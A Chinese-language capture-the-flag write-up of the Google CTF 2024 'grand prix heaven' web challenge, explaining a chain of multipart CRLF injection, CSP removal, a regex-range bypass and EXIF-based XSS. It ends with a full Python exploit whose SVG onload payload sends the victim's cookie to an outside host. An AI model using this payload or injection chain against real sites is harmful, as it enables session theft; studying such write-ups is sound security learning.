# grand prix heaven

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/7570101d-444d-444f-b05e-72170b0b3698)

## 概述

這題有個網頁

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c534a673-d576-4aae-9acd-513b1fa7731a)

可以 post 自己喜歡的車的圖片以及他的資訊，也可以用網址查看 post 後的車

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/85a74c69-789d-483a-99ad-aa6b43b63e5f)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/ec752fca-8fe5-4a61-8b37-835eaf467a3e)

接著他有兩個 server，一個是網頁，另一個是 template server，都是 nodejs，首先看看首頁的後端程式，我們可以注意到所有的 frontend route 都會有一個 template pieces，接著 web server 會把這個 template pieces 用 `multipart/form-data` 送到 template server，然後 template server 會依照這個 list 組合成一個 html 並回傳，然後 web server 再回傳這個 html 給 client。

```js
app.get("/", async (req, res) => {
  try {
    var data = {
      0: "csp",
      1: "head_end",
      2: "index",
      3: "footer",
    };
    await needle.post(
      TEMPLATE_SERVER,
      data,
      { multipart: true, boundary: BOUNDARY },
      function (err, resp, body) {
        if (err) throw new Error(err);
        return res.send(body);
      }
    );
  } catch (e) {
    console.log(`ERROR IN /:\n${e}`);
    return res.status(500).json({ error: "error" });
  }
});
```

再來講講 template server，他有很多用來組合網頁的零件，其中 `apiparser` 跟 `mediaparser` 最有趣，他分別對應到 `apiparser.js` 與 `mediaparser.js` 這兩個都是用來處理如何顯示 post 後的車的頁面，其中 mediaparser 被棄用，再 web server 裡完全看不到他，我們來看看程式碼。

```js
addEventListener("load", (event) => {
  params = new URLSearchParams(window.location.search);
  let requester = new Requester(params.get('F1'));
  try {
    let result = requester.makeRequest();
    result.then((resp) => {
        if (resp.headers.get('content-type') == 'image/jpeg') {
          var titleElem = document.getElementById("title-card");
          var dateElem = document.getElementById("date-card");
          var descElem = document.getElementById("desc-card");
          
          resp.arrayBuffer().then((imgBuf) => {
              const tags = ExifReader.load(imgBuf);
              descElem.innerHTML = tags['ImageDescription'].description;
              titleElem.innerHTML = tags['UserComment'].description;
              dateElem.innerHTML = tags['ICC Profile Date'].description;
          })
        }
    })
  } catch (e) {
    console.log("an error occurred with the Requester class.");
  }
});
```

可以看到他會讓 browser 依照 `F1` 這個 param 所設的路徑去取得 `https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/<F1>` 這個網站的內容，如果內容是 jpg 圖片的話，就解析圖片的一些資訊並讓前端顯示對應欄位的資料，這邊可以看到他是用 `innerHTML` 也就是說會有 `XSS`。

至於 `apiparser` 其實內容差不多。

```js
addEventListener("load", (event) => {
    params = new URLSearchParams(window.location.search);
    let requester = new Requester(params.get('F1'));
    try {
      let result = requester.makeRequest();
      result.then((resp) => resp.json()).then((jsonBody) => {
        var titleElem = document.getElementById("title-card");
        var dateElem = document.getElementById("date-card");
        var descElem = document.getElementById("desc-card");
        var imgElem = document.getElementById("img-card");
    
        titleElem.textContent = `${jsonBody.model} ${jsonBody.make}`;
        dateElem.textContent = jsonBody.createdAt;
        if (jsonBody.img_id != "") {
    	    imgElem.src = `/media/${jsonBody.img_id}`;
	    }
      })
    } catch (e) {
      console.log("an error occurred with the Requester class.");
    }
  });
```

只是改成用 json 處理並且用 `textContent` 設定欄位而已，所以要改成用 `mediaparser` 才會有 `XSS` 的問題。

至於如何發 request ，來看一下 `retrieve.js`。

```js
class Requester {
    constructor(url) {
        const clean = (path) => {
          try {
            if (!path) throw new Error("no path");
            let re = new RegExp(/^[A-z0-9\s_-]+$/i);
            if (re.test(path)) {
              // normalize
              let cleaned = path.replaceAll(/\s/g, "");
              return cleaned;
            } else {
              throw new Error("regex fail");
            }
          } catch (e) {
            console.log(e);
            return "dfv";
          }
          };
        url = clean(url);
        this.url = new URL(url, 'https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/');
      }
    makeRequest() {
        return fetch(this.url).then((resp) => {
            if (!resp.ok){
                throw new Error('Error occurred when attempting to retrieve media data');
            }
            return resp;
        });
    }
  }
```

可以看到這邊有路徑檢查

```js
            if (!path) throw new Error("no path");
            let re = new RegExp(/^[A-z0-9\s_-]+$/i);
            if (re.test(path)) {
              // normalize
              let cleaned = path.replaceAll(/\s/g, "");
              return cleaned;
            } else {
              throw new Error("regex fail");
            }
```

由於預設是 apiparser 所以拿到的資料應該會是 json，當成功改成 `mediaparser` 我們必須要繞過這個路徑檢查來達成存取圖片的目的。

最後 web server 有一個 route

```js
app.post("/report", async (req, res) => {
  const url = req.body.url;
  if (typeof url !== "string" || !url.startsWith('https://grandprixheaven-web.2024.ctfcompetition.com/')) {
    res.status(200).send("invalid url").end();
    return;
  }
  bot.visit(url);
  res.send("Done!").end();
});
```

因此我們可以知道這題是一個 XSS challenge

## 解題

目標是要新增一台車，並且顯示頁面時要使用 `mediaparser` 同時 `F1` param 必須要是上傳的圖片的路徑，且該圖片的資訊要有 XSS payload，且網頁不能有 CSP 否則 XSS 傳出資料時會被 CSP 擋住，最後送這網址給 bot 瀏覽。

首先我們來看看顯示車的 frontend route

```js
app.get("/fave/:GrandPrixHeaven", async (req, res) => {
  const grandPrix = await Configuration.findOne({
    where: { public_id: req.params.GrandPrixHeaven },
  });
  if (!grandPrix) return res.status(400).json({ error: "ERROR: ID not found" });
  let defaultData = {
    0: "csp",
    1: "retrieve",
    2: "apiparser",
    3: "head_end",
    4: "faves",
    5: "footer",
  };
  let needleBody = defaultData;
  if (grandPrix.custom != "") {
    try {
      needleBody = JSON.parse(grandPrix.custom);
      for (const [k, v] of Object.entries(needleBody)) {
        if (!TEMPLATE_PIECES.includes(v.toLowerCase()) || !isNum(parseInt(k)) || typeof(v) == 'object')
          throw new Error("invalid template piece");
        // don't be sneaky. We need a CSP!
        if (parseInt(k) == 0 && v != "csp") throw new Error("No CSP");
      }
    } catch (e) {
      console.log(`ERROR IN /fave/:GrandPrixHeaven:\n${e}`);
      return res.status(400).json({ error: "invalid custom body" });
    }
  }
  needle.post(
    TEMPLATE_SERVER,
    needleBody,
    { multipart: true, boundary: BOUNDARY },
    function (err, resp, body) {
      if (err) {
        console.log(`ERROR IN /fave/:GrandPrixHeaven:\n${e}`);
        return res.status(500).json({ error: "error" });
      }
      return res.status(200).send(body);
    }
  );
});
```

我們可以注意到這邊的 template pieces 是可以自己定義的

```js
  let needleBody = defaultData;
  if (grandPrix.custom != "") {
    try {
      needleBody = JSON.parse(grandPrix.custom);
      for (const [k, v] of Object.entries(needleBody)) {
        if (!TEMPLATE_PIECES.includes(v.toLowerCase()) || !isNum(parseInt(k)) || typeof(v) == 'object')
          throw new Error("invalid template piece");
        // don't be sneaky. We need a CSP!
        if (parseInt(k) == 0 && v != "csp") throw new Error("No CSP");
      }
    } catch (e) {
      console.log(`ERROR IN /fave/:GrandPrixHeaven:\n${e}`);
      return res.status(400).json({ error: "invalid custom body" });
    }
  }
```

如何定義就要看新增車的 route

```js
app.post("/api/new-car", async (req, res) => {
  let response = {
    img_id: "",
    config_id: "",
  };
  try {
    if (req.files && req.files.image) {
      const reqImg = req.files.image;
      if (reqImg.mimetype !== "image/jpeg") throw new Error("wrong mimetype");
      let request_img = reqImg.data;
      let saved_img = await Media.create({
        img: request_img,
        public_id: nanoid.nanoid(),
      });
      response.img_id = saved_img.public_id;
    }
    let custom = req.body.custom || "";
    let saved_config = await Configuration.create({
      year: req.body.year,
      make: req.body.make,
      model: req.body.model,
      custom: custom,
      public_id: nanoid.nanoid(),
      img_id: response.img_id
    });
    response.config_id = saved_config.public_id;
    return res.redirect(`/fave/${response.config_id}?F1=${response.config_id}`);
  } catch (e) {
    console.log(`ERROR IN /api/new-car:\n${e}`);
    return res.status(400).json({ error: "An error occurred" });
  }
});
```

我們只要在 post body 裡面多塞個 custom 裡面放 template pieces 的 json 就可以了。

再回到 `/fave/:GrandPrixHeaven`

這邊的定義 template pieces 還是有一些限制

```js
if (!TEMPLATE_PIECES.includes(v.toLowerCase()) || !isNum(parseInt(k)) || typeof(v) == 'object')
```

就是我們的 template piece 必須要包含再 `TEMPLATE_PIECES` 內且 index 必須要是數字，以及 template piece 的內容的 type 不能是 `object`。

```js
const TEMPLATE_PIECES = [
  "head_end",
  "csp",
  "upload_form",
  "footer",
  "retrieve",
  "apiparser", /* We've deprecated the mediaparser. apiparser only! */
  "faves",
  "index",
];
```

這邊數字的地方很有趣是他是先過 `parseInt` 再 `isNum` 而 js 的 `parseInt` 有一個特性是**只要 string 的開頭是數字都能被 parse 成數字**

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a6dc3e10-0f76-4574-b7a2-8f8c23189fbb)

所以我們可以利用這點在 index 裡面放任意的東西，這可以影響到傳遞的 template pieces 的排序，因為做 JSON.parse 時會對 key 做一次排序。

除此之外還會影響一個問題，就是可以做到 CRLF injection，且由於 boundary 是寫死的，這樣可以做到 inject multipart/form-data 來達成添加 template piece 的目標。

CSP 的部分由於他會強制檢查一定要有 csp 這個 template pieces 且 index 一定要是 0，但這邊的數字一樣是會過 parseInt 所以可以用上面講的方式去影響排序，讓 CSP 放到最後面，放到最後會有甚麼影響，這邊可以看到 template server 的 `index.js`。

```js
const parseMultipartData  = (data, boundary) => {
  var chunks = data.split(boundary);
  // always start with the <head> element
  var processedTemplate = templates.head_start;
  // to prevent loading an html page of arbitrarily large size, limit to just 7 at a time
  let end = 7;
  if (chunks.length-1 <= end) {
    end = chunks.length-1;
  }
  for (var i = 1; i < end; i++) {
    // seperate body from the header parts
    var lines = chunks[i].split('\r\n\r\n')
    .map((item) => item.replaceAll("\r\n", ""))
    .filter((item) => { return item != ''})
    for (const item of Object.keys(templates)) {
        if (lines.includes(item)) {
            processedTemplate += templates[item];
        }
    }
  }
  return processedTemplate;
}
```

可以看到他最多只拿最上面的 6 個 template pieces

```js
  let end = 7;
  if (chunks.length-1 <= end) {
    end = chunks.length-1;
  }
  for (var i = 1; i < end; i++) {
```

所以只要上面放 7 個 template pieces 並把 csp 移到最下面，取得的 html 就不會有 CSP

我們就可以構造出以下的 json

```json
{
  "1": "retrieve",
  "2\"\r\n\r\nmediaparser\r\n--GP_HEAVEN\r\nContent-Disposition: form-data; name=\"3": "head_end",
  "4": "faves",
  "5": "footer",
  "6": "footer",
  "0a": "csp"
}
```

然後 post 上去新增

(ps: 這是還沒處理 csp 的)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6b26b0c6-1e00-4d62-ae2e-5f60879241d4)

以後來看一下頁面

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a70d0d7e-1e55-4b03-b651-ab199381bbb5)

可以看到成功拿到 mediaparser，但由於我們 `F1` param 裡的 path 也就是 `https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/<F1>` 是 json 所以要想辦法讓 `F1` 跳到圖片的路徑，比如說 `../../media/<img-id>`。

但是 `retrieve.js` 有路徑檢查

```js
if (!path) throw new Error("no path");
            let re = new RegExp(/^[A-z0-9\s_-]+$/i);
            if (re.test(path)) {
              // normalize
              let cleaned = path.replaceAll(/\s/g, "");
              return cleaned;
            } else {
              throw new Error("regex fail");
            }
```

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6cc23108-5d12-4abc-9ddb-a1f44a9362be)

所以這邊要想辦法繞 RegExp。

裡面有一個部分很有趣，那就是 `A-z` 這邊應該要是 `A-Za-z`，這樣寫或造成的影響是，因為他是依照 ascii 的順序，因此放在 Z 到 a 中間的字元是可以用的，也就是 ``Z[\]^_`a`` 其中的 `\`，因為 `retrieve.js` 做 request 時會用 `new URL` 做 url parse，而 `\` 會被他解成 `/`，並且如果 path 是絕對路徑時，他會把 base url 裡變得 path 蓋掉，所以如果我放 `\media\<img-id>` 會被他解析成 `https://grandprixheaven-web.2024.ctfcompetition.com/media/<img-id>`，這樣就成功繞過了。

因此我們的 xss url 會是 `https://grandprixheaven-web.2024.ctfcompetition.com/fave/<car-id>?F1=\media\<img-id>`，把這個丟 `report` 就能 xss

所以整體順序是：
1. 先生帶 xss payload 的圖片
2. 新增車並上傳該圖片，並且對 custom 做操作繞過檢查塞進 `mediaparser` 且拔掉 `csp`
3. 取得車的 url
4. 解析 json 拿到 img-id
5. 構建 xss url

## exploit

```python
from PIL import Image
import piexif
import io
import requests
import urllib.parse

url = "https://grandprixheaven-web.2024.ctfcompetition.com"
httpserver = "https://vpn.chummydns.com:20000/"

img = Image.new('RGB', (10, 10))
exif_dict = {'0th': {270: f"<svg><svg/onload='window.location=\"{httpserver}\"+document.cookie'>"}}
exif_bytes = piexif.dump(exif_dict)

buffer = io.BytesIO()

img.save(buffer, format='JPEG', exif=exif_bytes)

buffer.seek(0)

r = requests.post(urllib.parse.urljoin(url, '/api/new-car'), allow_redirects=False, files={
    'image': ('test.jpg', buffer, 'image/jpeg'),
}, data={
    'year': 2004,
    'make': 'aaa',
    'model': 'aaa',
    'custom': '{"1":"retrieve","2\\"\\r\\n\\r\\nmediaparser\\r\\n--GP_HEAVEN\\r\\nContent-Disposition: form-data; name=\\"3":"head_end","4":"faves","5":"footer","6":"footer","0a":"csp"}'
})

f1url = urllib.parse.urlparse(urllib.parse.urljoin(url, r.headers['Location']))

f1path = f1url.path
f1query = urllib.parse.parse_qs(f1url.query)

r = requests.get(urllib.parse.urljoin(url, f"/api/get-car/{f1query['F1'][0]}"))

imgid = r.json()['img_id']
params = {
    "F1": f"\media\{imgid}"
}

xssurl = f'{urllib.parse.urljoin(url, f1path)}?{urllib.parse.urlencode(params)}'

requests.post(urllib.parse.urljoin(url, "/report"), data={
    'url': xssurl
})
```

## Flag

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/306d7180-00af-452e-a4dd-d959b8562b4c)

`CTF{Car_go_FAST_hEART_Go_FASTER!!!}`

